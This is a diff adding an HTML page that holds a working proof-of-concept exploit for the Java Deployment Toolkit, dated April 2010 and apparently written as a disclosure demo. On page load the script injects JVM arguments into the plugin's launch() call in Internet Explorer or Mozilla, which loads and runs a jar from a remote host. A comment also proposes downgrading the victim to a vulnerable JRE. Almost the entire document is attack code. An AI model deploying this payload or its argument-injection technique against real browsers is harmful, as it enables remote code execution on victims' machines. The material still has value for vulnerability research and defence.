@@ -1,0 +1,47 @@
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Java Deployment Toolkit Test Page&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        // Tavis Ormandy &lt;taviso@sdf.lonestar.org&gt;, April 2010
+ 
+        var u = &quot;http: -J-jar -J\\\\lock.cmpxchg8b.com\\calc.jar none&quot;;
+ 
+        if (window.navigator.appName == &quot;Microsoft Internet Explorer&quot;) {
+            var o = document.createElement(&quot;OBJECT&quot;);
+ 
+            o.classid = &quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;;
+ 
+            // Trigger the bug
+            o.launch(u);
+        } else {
+            // Mozilla
+            var o = document.createElement(&quot;OBJECT&quot;);
+            var n = document.createElement(&quot;OBJECT&quot;);
+ 
+            o.type = 
+&quot;application/npruntime-scriptable-plugin;deploymenttoolkit&quot;;
+            n.type = &quot;application/java-deployment-toolkit&quot;;
+            document.body.appendChild(o);
+            document.body.appendChild(n);
+ 
+            // Test both MIME types
+            try {
+                // Old type
+                o.launch(u);
+            } catch (e) {
+                // New type
+                n.launch(u);
+            }
+        }
+ 
+        // Bonus Vulnerability, why not downgrade victim to a JRE 
+vulnerable to
+        // this classic exploit?
+        // 
+http://sunsolve.sun.com/search/document.do?assetkey=1-66-244991-1
+ 
+        // o.installJRE(&quot;1.4.2_18&quot;);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
